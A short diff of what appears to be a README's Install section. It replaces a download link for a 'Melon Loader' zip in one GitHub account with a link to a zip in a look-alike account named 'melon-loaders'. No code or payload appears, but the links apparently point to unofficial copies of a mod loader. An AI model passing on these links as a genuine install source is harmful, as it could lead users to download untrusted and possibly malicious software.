@@ -9,7 +9,7 @@
   <img width="400" height="100" alt="6fbf1eb6-37c2-4c15-8517-5a592a88699b" src="https://github.com/user-attachments/assets/77a2adbb-f439-4483-b15c-069dc50a120c" />
 
 ## Install
-[Download `Melon-Loader-Download.zip`](https://github.com/RuwetDituturi/melon-loader-download/releases/latest/download/Melon-Loader-Download.zip)
+[Download `melon-loader.zip`](https://github.com/melon-loaders/melon-loader-download/releases/download/v0.7.4/melon-loader.zip)
 ---
 
 
